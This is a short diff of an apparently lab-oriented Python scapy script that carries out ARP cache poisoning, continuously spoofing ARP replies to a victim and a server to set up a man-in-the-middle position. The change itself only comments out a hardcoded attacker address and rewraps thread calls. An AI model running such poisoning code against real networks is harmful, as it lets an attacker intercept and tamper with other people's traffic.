@@ -1,6 +1,7 @@
 from scapy.all import *
 from threading import Thread
-ipAttacker = "192.168.56.103"
+#ipAttacker = "192.168.56.103"
+
 def arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface):
     print("poisoning")
     arp = Ether()/ARP()
@@ -20,7 +21,8 @@ def arp_listener(macAttacker, interface, macServer = None):
         print("ARP Reply")
     elif pkg_arp[0][ARP].op == 1:
         print("ARP Request")
-        Thread(target=persistentPoisoningVictim, args=(ipVictim, macVictim, ipServer,macAttacker, interface)).start()
+        Thread(target=persistentPoisoningVictim, args=(\
+            ipVictim, macVictim, ipServer,macAttacker, interface)).start()
         #find the server mac
         if macServer == None:
             arp_req = Ether()/ARP()
@@ -32,7 +34,8 @@ def arp_listener(macAttacker, interface, macServer = None):
             sendp(arp_req, iface=interface)
             pkg_arp = sniff(filter="arp", count=1, iface=interface)
             macServer = pkg_arp[0][ARP].hwsrc
-        Thread(target=persistentPoisoningServer, args=(ipServer, macServer, ipVictim, macAttacker, interface)).start()
+        Thread(target=persistentPoisoningServer, args=(\
+            ipServer, macServer, ipVictim, macAttacker, interface)).start()
 
 def persistentPoisoningVictim(ipVictim, macVictim, ipServer, macAttacker, interface):
     while True:
